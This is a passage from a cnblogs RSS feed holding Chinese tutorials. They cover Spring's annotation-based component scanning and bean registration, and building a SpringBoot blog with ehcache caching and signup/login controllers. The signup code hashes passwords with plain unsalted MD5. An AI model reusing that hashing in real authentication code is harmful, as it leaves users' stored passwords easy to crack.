      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;注意：这里的从mapping中得到的key为Object的，因为这里可能为各种不同的具体Handeler，namespaceUri不同，则其value不同
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里根据namespaceUri为context的值：org.springframework.context.config.ContextNamespaceHandler，发现不为null&lt;/span&gt;
      Object handlerOrClassName =&lt;span&gt; handlerMappings.get(namespaceUri);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;if判断不为空，跳过此逻辑&lt;/span&gt;
      &lt;span&gt;if&lt;/span&gt; (handlerOrClassName == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
         &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
      }
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断不为NamespaceHandler的实例&lt;/span&gt;
      &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (handlerOrClassName &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; NamespaceHandler) {
         &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; (NamespaceHandler) handlerOrClassName;
      }
      &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;直接将前面的“org.springframework.context.config.ContextNamespaceHandler”转成String类型的&lt;/span&gt;
         String className =&lt;span&gt; (String) handlerOrClassName;
         &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;生成类&lt;/span&gt;
            Class&amp;lt;?&amp;gt; handlerClass = ClassUtils.forName(className, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.classLoader);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!NamespaceHandler.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;.isAssignableFrom(handlerClass)) {
               &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; FatalBeanException(&quot;Class [&quot; + className + &quot;] for namespace [&quot; + namespaceUri +
                     &quot;] does not implement the [&quot; + NamespaceHandler.&lt;span&gt;class&lt;/span&gt;.getName() + &quot;] interface&quot;&lt;span&gt;);
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;类的实例化,如果是前一个函数中的&amp;lt;context:Component-scan&amp;gt;这里得到的Handler为：
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;org.springframework.context.config.ContextNamespaceHandler&lt;/span&gt;
            NamespaceHandler namespaceHandler =&lt;span&gt; (NamespaceHandler) BeanUtils.instantiateClass(handlerClass);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;因为上面是ContextNamespaceHandler，将N种不同的key对应的具体的parser进行new之后作为key放到parsers的map中
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里针对key为&quot;component-scan&quot;，直接new的实例就是：ComponentScanBeanDefinitionParser&lt;/span&gt;
&lt;span&gt;            namespaceHandler.init();
            handlerMappings.put(namespaceUri, namespaceHandler);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; namespaceHandler;
         }
         &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (ClassNotFoundException ex) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; FatalBeanException(&quot;Could not find NamespaceHandler class [&quot; + className +
                  &quot;] for namespace [&quot; + namespaceUri + &quot;]&quot;&lt;span&gt;, ex);
         }
         &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (LinkageError err) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; FatalBeanException(&quot;Unresolvable class definition for NamespaceHandler class [&quot; +&lt;span&gt;
                  className &lt;/span&gt;+ &quot;] for namespace [&quot; + namespaceUri + &quot;]&quot;&lt;span&gt;, err);
         }
      }
   }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;之后通过handler实例进行parse方法调用，实现类为：NamespaceHandlerSupport，其中parse方法如下，就是找到真正的parser，从之前的handler的init操作所put的map中将需要解析的key对应的value即解析类实例取出，然后进行真正的解析操作，在parse中会将bean定义注册代理给scanner类实例，之后通过scanner.doScan()方法调用真正完成bean的解析和注册到容器中&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; BeanDefinition parse(Element element, ParserContext parserContext) {
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;确定是什么parser，之前已经存储在Handler的parsers的map中
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;find就是找到对应element对应的具体key的具体解析类&lt;/span&gt;
   BeanDefinitionParser parser =&lt;span&gt; findParserForElement(element, parserContext);
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据具体解析类，直接进行对应的解析调用&lt;/span&gt;
   &lt;span&gt;return&lt;/span&gt; (parser != &lt;span&gt;null&lt;/span&gt; ? parser.parse(element, parserContext) : &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;就进入到parser.parse()部分，因为对应key为Component-scan对应的解析类为ComponentScanBeanDefinitionParser类，进入到此类的parse方法中：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; BeanDefinition parse(Element element, ParserContext parserContext) {
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据element为“base=package”得到基础包路径&lt;/span&gt;
   String basePackage =&lt;span&gt; element.getAttribute(BASE_PACKAGE_ATTRIBUTE);
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;解析basePacakge的String值，将占位符前后缀都去掉&lt;/span&gt;
   basePackage =&lt;span&gt; parserContext.getReaderContext().getEnvironment().resolvePlaceholders(basePackage);
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里其实就是对String的basePackage进行解析，最终得到：
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;按照分隔符将多个路径转换成数组，并去掉空格以及换行符等&lt;/span&gt;
   String[] basePackages =&lt;span&gt; StringUtils.tokenizeToStringArray(basePackage,
         ConfigurableApplicationContext.CONFIG_LOCATION_DELIMITERS);

   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Actually scan for bean definitions and register them.
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;进行beandefinition的扫描并注册
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将bean定义注册代理给scanner类处理&lt;/span&gt;
   ClassPathBeanDefinitionScanner scanner =&lt;span&gt; configureScanner(parserContext, element);
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;doScan的调用&lt;/span&gt;
   Set&amp;lt;BeanDefinitionHolder&amp;gt; beanDefinitions =&lt;span&gt; scanner.doScan(basePackages);
   registerComponents(parserContext.getReaderContext(), beanDefinitions, element);

   &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;进入到比较重要的部分:ClasspathBeanDefinitionScanner类的doScan()方法，该方法主要做的事情是：针对xml中所做的配置&amp;lt;context:component-scan base-package=&quot;cn.lx.controller&quot; /&amp;gt;，根据base-package的package路径下的class文件，进行遍历操作，根据其是否具备注解定义，得到beanDefinition的候选集合，针对候选集中的每一个beanDefinition，进行beanName的生成，并且针对是否属于AbstractBeanDefinition和AnnotatedBeanDefinition，进行相应的属性设置，之后会通过beanName获取是否已经容器中是否已经存在此beanName，若无则直接返回true，表示需要进行后续注册操作，即进入到了register的过程&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;其中doScan的主要方法及注释如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;针对xml中所做的配置&amp;lt;context:component-scan base-package=&quot;cn.lx.controller&quot; /&amp;gt;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据base-package的package路径下的class文件，进行遍历操作
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据其是否具备注解定义，得到beanDefinition的候选集合
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;针对候选集中的每一个beanDefinition，进行beanName的生成
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;并生成BeanDefinitionHolder，进行scopeProxyMode的设置，之后进行register操作
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;和非注解形式的合并到一路上了，后续的注册操作&lt;/span&gt;
&lt;span&gt;protected&lt;/span&gt; Set&amp;lt;BeanDefinitionHolder&amp;gt;&lt;span&gt; doScan(String... basePackages) {
   Assert.notEmpty(basePackages, &lt;/span&gt;&quot;At least one base package must be specified&quot;&lt;span&gt;);
   Set&lt;/span&gt;&amp;lt;BeanDefinitionHolder&amp;gt; beanDefinitions = &lt;span&gt;new&lt;/span&gt; LinkedHashSet&amp;lt;&amp;gt;&lt;span&gt;();
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;针对basePackages中的每一项basePackage做循环&lt;/span&gt;
   &lt;span&gt;for&lt;/span&gt;&lt;span&gt; (String basePackage : basePackages) {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;得到候选BeanDefinition集合，注意这里如果没有@Controller等注解样式的是不会被加入到候选集中&lt;/span&gt;
      Set&amp;lt;BeanDefinition&amp;gt; candidates =&lt;span&gt; findCandidateComponents(basePackage);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;针对集合中的每一个候选项BeanDefinition进行详细的解析和处理&lt;/span&gt;
      &lt;span&gt;for&lt;/span&gt;&lt;span&gt; (BeanDefinition candidate : candidates) {
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里的生成内容会基于scope的字符进行解析，会得到：
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;scopedName和scopedProxyMode，其中scopeName不单独说明的话，则默认为singleton,ProxyMode为No&lt;/span&gt;
         ScopeMetadata scopeMetadata = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.scopeMetadataResolver.resolveScopeMetadata(candidate);
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;基于解析获得scope的性质给candidate设值&lt;/span&gt;
&lt;span&gt;         candidate.setScope(scopeMetadata.getScopeName());
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取beanName,会走两步判断，有指定beanName的会直接赋值返回，否则会build默认的name，即shortName，例如：
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;cn.lx.controller.LoginController，则会取LoginController，并且会将首字母小写，最终形式是：loginController&lt;/span&gt;
         String beanName = &lt;span&gt;this&lt;/span&gt;.beanNameGenerator.generateBeanName(candidate, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.registry);
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断beanDefinition的类型&lt;/span&gt;
         &lt;span&gt;if&lt;/span&gt; (candidate &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; AbstractBeanDefinition) {
            postProcessBeanDefinition((AbstractBeanDefinition) candidate, beanName);
         }
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;基于注解类型的BeanDefinition
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;其实没有看AbstractBeanDefinition和AnnotatedBeanDefinition有何不同，写具体文章的时候要看
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;AnnotatedBeanDefinition是接口
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;其中在candidates的生成方法findCandidateComponents()进行candidates的候选集的生成中
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ScannedGenericBeanDefinition是实现了AnnotatedBeanDefinition接口的
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回的beanDefinition本身就是就是实现了这个接口的，因此必然满足instanceof&lt;/span&gt;
         &lt;span&gt;if&lt;/span&gt; (candidate &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; AnnotatedBeanDefinition) {
            AnnotationConfigUtils.processCommonDefinitionAnnotations((AnnotatedBeanDefinition) candidate);
         }
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;对beanName和候选项的bean进行校验，以确定是否要进行注册，还是可能与已有bean存在冲突&lt;/span&gt;
         &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (checkCandidate(beanName, candidate)) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;BeanDefinition的持有者&lt;/span&gt;
            BeanDefinitionHolder definitionHolder = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; BeanDefinitionHolder(candidate, beanName);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置ScopeProxyMode，若为设置，则默认为No，直接返回beanDefinition&lt;/span&gt;
            definitionHolder =&lt;span&gt;
              AnnotationConfigUtils.applyScopedProxyMode(scopeMetadata, definitionHolder, &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.registry);
            beanDefinitions.add(definitionHolder);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;真正标识着下一步就是register的操作了，只是要一步步走到DefaultListableBeanFactory类实例中的注册方法的调用&lt;/span&gt;
            registerBeanDefinition(definitionHolder, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.registry);
         }
      }
   }
   &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; beanDefinitions;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;register过程：&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;register过程无所谓是针对有无注解的情况，都是相同的逻辑，通过ClassPathBeanDefinitionScanner类的registerBeanDefition方法，其实调用的是BeanDefinitionReaderUtils类的静态方法registerBeanDefinition，之后再跟进到此静态方法中，就进入到了DefaultListableBeanFactory类的register操作，就会进行真正的map操作了&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; registerBeanDefinition(BeanDefinitionHolder definitionHolder, BeanDefinitionRegistry registry) {
   BeanDefinitionReaderUtils.registerBeanDefinition(definitionHolder, registry);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;&lt;span&gt;三、过程时序图（梳理主要调用逻辑，涉及类和方法，可通过下载大图查看）&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/634202/201905/634202-20190508125318021-1053192534.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 08 May 2019 06:14:00 +0000</pubDate>
<dc:creator>可可_小虾米</dc:creator>
<og:description>前面的文章写了xml中直接配置bean进行IOC的过程解析，接下来会针对注解进行IOC容器初始化的过程解析 因为会与之前的内容存在部分重叠，因此会针对相同的部分简略带过，针对不同的部分做重点说明： 一</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/keke-xiaoxiami/p/10773017.html</dc:identifier>
</item>
<item>
<title>基于SpringBoot从零构建博客网站 - 整合ehcache和开发注册登录功能 - 架构与我</title>
<link>http://www.cnblogs.com/atcloud/p/10831548.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/atcloud/p/10831548.html</guid>
<description>&lt;p&gt;对于程序中一些字典信息、配置信息应该在程序启动时加载到缓存中，用时先到缓存中取，如果没有命中，再到数据库中获取同时放到缓存中，这样做可以减轻数据库层的压力。目前暂时先整合ehcache缓存，同时预留了集成redis和memcached的接口。&lt;/p&gt;
&lt;p&gt;先开发两个最基本的功能，就是注册和登录，对于页面几乎就是直接用bootstrap的风格，目前没有过多的设计。&lt;/p&gt;
&lt;h2 id=&quot;整合ehcache&quot;&gt;1、整合ehcache&lt;/h2&gt;
&lt;p&gt;在spring boot中整合ehcache还是很方便的，首先添加依赖：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;spring-boot-starter-cache&amp;lt;/artifactId&amp;gt;
&amp;lt;/dependency&amp;gt;

&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;net.sf.ehcache&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;ehcache&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;2.10.2&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;新增ehcache的配置文件，ehcache.xml，即：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;ehcache xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:noNamespaceSchemaLocation=&quot;ehcache.xsd&quot; 
    updateCheck=&quot;false&quot;
    monitoring=&quot;autodetect&quot; 
    dynamicConfig=&quot;true&quot;&amp;gt;

&amp;lt;diskStore path=&quot;java.io.tmpdir&quot; /&amp;gt;

&amp;lt;!-- 系统临时缓存（十分钟） --&amp;gt; 
&amp;lt;cache 
    name=&quot;SystemTempCache&quot; 
    maxEntriesLocalHeap=&quot;0&quot;
    maxEntriesLocalDisk=&quot;10000000&quot;
    eternal=&quot;false&quot;
    timeToIdleSeconds=&quot;0&quot; 
    timeToLiveSeconds=&quot;600&quot; 
    overflowToDisk=&quot;false&quot;
    diskPersistent=&quot;false&quot;
    diskExpiryThreadIntervalSeconds=&quot;120&quot;
    diskSpoolBufferSizeMB=&quot;30&quot;
    memoryStoreEvictionPolicy=&quot;LRU&quot;&amp;gt;
&amp;lt;/cache&amp;gt; 

&amp;lt;!-- 系统永久缓存 --&amp;gt; 
&amp;lt;cache 
    name=&quot;SystemEternalCache&quot; 
    maxEntriesLocalHeap=&quot;0&quot;
    maxEntriesLocalDisk=&quot;10000000&quot;
    eternal=&quot;true&quot;
    overflowToDisk=&quot;false&quot;
    diskPersistent=&quot;false&quot;
    diskExpiryThreadIntervalSeconds=&quot;120&quot;
    diskSpoolBufferSizeMB=&quot;30&quot;
    memoryStoreEvictionPolicy=&quot;LRU&quot;&amp;gt;
&amp;lt;/cache&amp;gt;

&amp;lt;/ehcache&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中设置了两种缓存类型，一个是临时缓存，另一个是永久缓存。&lt;/p&gt;
&lt;p&gt;此处使用缓存方式不是基于注解的，虽然基于注解的方式也很方便，但是个人觉得还是自己程序控制缓存好一些。&lt;/p&gt;
&lt;p&gt;程序中会将站点的配置信息加载到缓存中，那么使用方式如下：&lt;/p&gt;
&lt;p&gt;（1）、首先定义一个缓存接口，本程序中需要用到缓存的，必须实现该接口，即：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.swnote.common.cache;

/**
 * 缓存接口
 *
 * @author lzj
 * @since 1.0
 * @date [2019-04-27]
 */
public interface ICache&amp;lt;T&amp;gt; {
    /**
     * 根据key获取缓存数据
     *
     * @param key
     * @return
     */
    public T get(Object key);

    /**
     * 存放缓存数据
     *
     * @param key
     * @param value
     */
    public void put(Object key, T value);

    /**
     * 根据key移除内容
     *
     * @param key
     */
    public void remove(Object key);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（2）、站点配置信息缓存ConfigCache，实现该接口，即：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package com.swnote.common.cache;

import com.swnote.common.domain.Config;
import com.swnote.common.service.IConfigService;
import com.swnote.common.util.Const;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.cache.Cache;
import org.springframework.cache.CacheManager;
import org.springframework.context.annotation.DependsOn;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import java.util.List;

/**
 * 缓存配置信息
 * 配置信息放到系统永久缓存中，存放形式为：&quot;_CONFIG&quot; + configId为key，value为配置信息对象
 *
 * @author lzj
 * @since 1.0
 * @date [2019-04-27]
 */
@Slf4j
@DependsOn(&quot;configService&quot;)
@Component(&quot;configCache&quot;)
public class ConfigCache implements ICache&amp;lt;Config&amp;gt; {

    /**
     * 注入基于Spring提供的Cache接口实例，默认由Ehcache实现
     * TODO 以后也可以是Redis、Memcached提供实现
     */
    @Autowired
    private CacheManager cacheManager;

    @Autowired
    private IConfigService configService;

    /**
     * 系统临时缓存实例
     */
    private Cache cache;

    /**
     * key的前缀
     */
    private String keyPrefix = &quot;_CONFIG&quot;;

    @PostConstruct
    public void init() {
        // 获取系统永久缓存实例
        cache = cacheManager.getCache(Const.CACHE_SYSTEM_ETERNAL);
        log.info(&quot;获取系统永久缓存实例&quot;);

        log.info(&quot;开始加载所有配置信息&quot;);
        List&amp;lt;Config&amp;gt; configs = configService.list();
        if (configs != null &amp;amp;&amp;amp; !configs.isEmpty()) {
            configs.stream().forEach(config -&amp;gt; cache.put(keyPrefix + config.getConfigId(), config));
        }
        log.info(&quot;加载完毕所有配置信息&quot;);
    }

    @Override
    public Config get(Object key) {
        Cache.ValueWrapper valueWrapper = cache.get(keyPrefix + key);
        if (valueWrapper == null) {
            // 此时从数据库重新加载一次
            Config config = configService.getById((String) key);
            if (config == null) {
                return null;
            }

            // 再次放到缓存中
            cache.put(keyPrefix + config.getConfigId(), config);

            return config;
        }
        return (Config) valueWrapper.get();
    }

    @Override
    public void put(Object key, Config value) {
        cache.put(keyPrefix + key, value);
    }

    @Override
    public void remove(Object key) {
        cache.evict(keyPrefix + key);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;注册功能&quot;&gt;2、注册功能&lt;/h2&gt;
&lt;p&gt;注册页面效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/840503/201905/840503-20190508141223368-39697084.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;页面风格很素，这个暂时先这样。&lt;/p&gt;
&lt;p&gt;主要看一下UserController中处理注册信息的关键代码，即：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;/**
 * 保存注册信息
 * 
 * @param model
 * @param request
 * @return
 */
@RequestMapping(value = &quot;/auth/signup&quot;, method = RequestMethod.POST)
@ResponseBody
public Result signup(Model model, HttpServletRequest request) {
    Result result = new Result();
    try {
        // 接收参数
        String name = request.getParameter(&quot;name&quot;);
        String email = request.getParameter(&quot;email&quot;);
        String password = request.getParameter(&quot;password&quot;);

        // 简单校验
        if (StringUtils.isEmpty(name) || StringUtils.isEmpty(email) || StringUtils.isEmpty(password)) {
            throw new TipException(&quot;缺少必要请求参数&quot;);
        }

        if (!StringUtil.isEmail(email)) {
            throw new TipException(&quot;邮箱不符全规范&quot;);
        }
        
        // 校验用户名
        User tempUser = userService.getByName(name);
        if (tempUser != null &amp;amp;&amp;amp; !StringUtils.isEmpty(tempUser.getUserId())) {
            throw new TipException(&quot;该用户已经注册了&quot;);
        }
        
        // 校验邮箱
        tempUser = userService.getByEmail(email);
        if (tempUser != null &amp;amp;&amp;amp; !StringUtils.isEmpty(tempUser.getUserId())) {
            throw new TipException(&quot;该邮箱已经注册了&quot;);
        }

        // 获取用户ip
        String ip = HttpUtil.getIpAddr(request);

        // 构建用户信息
        User user = new User();
        user.setLoginName(name);
        user.setEmail(email);
        user.setPassword(StringUtil.md5(password));
        user.setCreateIp(ip);
        
        // 保存用户信息
        boolean flag = userService.create(user);
        if (!flag) {
            throw new TipException(&quot;用户创建失败&quot;);
        }

        result.setCode(Result.CODE_SUCCESS);
        result.setMsg(&quot;用户创建成功&quot;);
    } catch (Exception e) {
        log.error(&quot;用户创建失败&quot;, e);
        result.setCode(Result.CODE_EXCEPTION);
        result.setMsg(&quot;用户创建失败&quot;);
    }
    return result;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在UserService中有一个create方法，即：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Override
public boolean create(User user) {
    // 获取当前时间
    Date now = new Date();

    // 设置主键
    user.setUserId(IdGenarator.guid());
    // 设置未实名认证
    user.setRealStatus(User.REAL_STATUS_NO);

    // 用户是否需要激活
    Config config = configCache.get(Const.CONFIG_USER_ACTIVE);
    if (config != null &amp;amp;&amp;amp; &quot;1&quot;.equals(config.getConfigValue())) {
        // TODO 发送激活邮件信息
        // 说明需要激活
        user.setIsActive(User.ACTIVE_NO);
    } else {
        // 说明不需要激活，默认激活
        user.setIsActive(User.ACTIVE_YES);
    }

    // 设置启用账号状态
    user.setStatus(User.STATUS_YES);
    // 设置创建时间
    user.setCreateTime(now);
    // 设置关注数为0
    user.setFollows(0);
    // 设置粉丝数为0
    user.setFans(0);
    return save(user);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;此处有一个还没有实现的功能，就是发送激活邮件信息，这个功能后面会补上，这里先处于TODO状态。&lt;/p&gt;
&lt;h2 id=&quot;登录功能&quot;&gt;3、登录功能&lt;/h2&gt;
&lt;p&gt;登录页面效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/840503/201905/840503-20190508141235195-745792976.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;UserController中关键的代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;/**
 * 处理登录信息
 *
 * @param request
 * @return
 */
@RequestMapping(value = &quot;/auth/login&quot;, method = RequestMethod.POST)
@ResponseBody
public Result login(HttpServletRequest request, HttpSession session) {
    Result result = new Result();
    try {
        // 接收参数
        String name = request.getParameter(&quot;name&quot;);
        String password = request.getParameter(&quot;password&quot;);

        if (StringUtils.isEmpty(name) || StringUtils.isEmpty(password)) {
            throw new TipException(&quot;缺少必要请求参数&quot;);
        }

        // 获取用户ip
        String ip = HttpUtil.getIpAddr(request);

        User user = userService.verifyUser(name, password, ip);
        if (user == null) {
            throw new TipException(&quot;用户名或密码错误&quot;);
        }

        // 放置session信息
        session.setAttribute(Const.SESSION_USER, user);

        // TODO 还有一些相关统计信息，后面再加上

        result.setCode(Result.CODE_SUCCESS);
        result.setMsg(&quot;登录成功&quot;);
    } catch (TipException e) {
        result.setCode(Result.CODE_EXCEPTION);
        result.setMsg(e.getMessage());
    } catch (Exception e) {
        log.error(&quot;登录失败&quot;, e);
        result.setCode(Result.CODE_EXCEPTION);
        result.setMsg(&quot;登录失败&quot;);
    }
    return result;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当用户登录时，还有一些相关统计信息，这里由于其它功能还没有开发完，所以获取统计信息的代码后面再加上。&lt;/p&gt;
&lt;h2 id=&quot;关注我&quot;&gt;关注我&lt;/h2&gt;
&lt;p&gt;以你最方便的方式关注我：&lt;br/&gt;微信公众号：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/840503/201905/840503-20190508141256409-1807515481.jpg&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 08 May 2019 06:13:00 +0000</pubDate>
<dc:creator>架构与我</dc:creator>
<og:description>对于程序中一些字典信息、配置信息应该在程序启动时加载到缓存中，用时先到缓存中取，如果没有命中，再到数据库中获取同时放到缓存中，这样做可以减轻数据库层的压力。目前暂时先整合ehcache缓存，同时预留了</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/atcloud/p/10831548.html</dc:identifier>
</item>
<item>
<title>[AI开发]基于DeepStream的视频结构化解决方案 - 周见智</title>
<link>http://www.cnblogs.com/xiaozhi_5638/p/10831459.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiaozhi_5638/p/10831459.html</guid>
<description>
&lt;p&gt;&lt;span&gt;&lt;strong&gt;视频结构化的定义&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
